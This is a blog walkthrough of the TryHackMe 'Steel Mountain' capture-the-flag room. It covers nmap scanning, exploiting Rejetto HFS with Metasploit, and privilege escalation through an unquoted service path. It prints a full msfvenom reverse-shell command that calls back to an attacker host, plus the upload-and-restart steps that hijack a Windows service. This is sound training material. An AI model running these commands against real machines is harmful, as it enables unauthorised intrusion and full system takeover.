---
title: "THM: Steel Mountain"
date: 2025-12-18 12:34:00 +1000
categories: [TryHackMe, Easy]
tags: [Windows, MRrobot, USP, PrivEsc, HFS, Rejetto, CVE-2014-1767, MS14-040]
---

![Banner](/assets/Images/Steel-Mountain/banner.jpeg)

"Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."

---

## Phase 1: Information gathering

Nmap scans revealed the following:
```bash
PORT      STATE    SERVICE         VERSION
==================================================================
80        open     http            Microsoft IIS httpd 8.5
135       open     msrpc           Microsoft Windows RPC
139       open     netbios-ssn     Microsoft Windows netbios-ssn
445       open     microsoft-ds    Microsoft Windows Server 2008 R2 - 2012 
3389      open     ms-wbt-server   Microsoft Terminal Services
5985      open     http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080      open     http            HttpFileServer httpd 2.3
47001     open     http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152     open     msrpc           Microsoft Windows RPC
49153     open     msrpc           Microsoft Windows RPC
49154     open     msrpc           Microsoft Windows RPC
49155     open     msrpc           Microsoft Windows RPC
49157     open     msrpc           Microsoft Windows RPC
49184     open     msrpc           Microsoft Windows RPC
49187     open     msrpc           Microsoft Windows RPC
==================================================================
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain

8080/tcp  open  http
|_http-server-header: HFS 2.3
|_http-title: HFS /

OS details: Microsoft Windows Server 2012 or 2012 R2
```
- Add steelmountain to /etc/hosts

## Phase 2: Enumeration

- Investigate the two seperate web servers on port 80 & 8080.
- Test weak SMB configurations.


On port 80 we find our first flag. Seek the source and you shall find. 
![Bill](/assets/Images/Steel-Mountain/bill.png)

On port 8080 we've got rejetto http file server which is famously vulnerable and has a metasploit module.
![Bill](/assets/Images/Steel-Mountain/hfs.png)

![Rejetto](/assets/Images/Steel-Mountain/rejetto.png)

## Phase 3: Gaining access

A quick speachsploit query shows us the module we need and the CVE
![CVE](/assets/Images/Steel-Mountain/cve.png)

Quick and easy, we're in.
![MSF](/assets/Images/Steel-Mountain/meterpreter1.png)

## Phase 4: Privilege escalation

Once you get meterpreter, always try the "getsystem" command if unprivileged and whoami /priv to get an idea of what you can do. Here the focus is on a ps1 script.
```bash
# Navigate to your working directory in a different terminal
curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 > PowerUp.ps1
```

Upload and execute the ps1 script:
```bash
meterpreter> cd C:\Users\bill\Desktop
meterpreter> upload /path/to/PowerUp.ps1
meterpreter> load powershell
meterpreter> powershell_shell
PS> . .\PowerUp.ps1
PS> Invoke-Allchecks
```

**Results:**
![Unquoted](/assets/Images/Steel-Mountain/path.png)

**Sidenote:**
The first dot (.) is the dot-sourcing operator. It executes the script in the current scope so functions like Invoke-AllChecks are available in your session.
Without it, .\PowerUp.ps1 runs in a child scope and the functions won't be accessible.

Navigate to the path and delete Advanced.exe
```bash
PS> dir /s /b Advanced.exe
PS> cd "C:\Program Files (x86)\IObit\"
PS> DEL Advanced.exe
```
Back on your attacker machine we craft the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

**Start Your Listener**


Upload and execute the reverse shell:
```bash
meterpreter> cd "C:\Program Files (x86)\IObit\"
meterpreter> upload /path/to/Advanced.exe (Reverse shell)
meterpreter> shell
C:\Program Files (x86)\IObit> net stop AdvancedSystemCareService9
C:\Program Files (x86)\IObit> net start AdvancedSystemCareService9    
```

You should now have a nt authority\system session.
![NT\SYSTEM](/assets/Images/Steel-Mountain/nt.png)
![ROOTFLAG](/assets/Images/Steel-Mountain/root.png)

---

**Thats all folks!**

---

**Room:** Steel Mountain | **Platform:** TryHackMe | **Difficulty:** Easy | **Focus:** Unquoted service paths | **CVE:** CVE-2014-1767, MS14-040
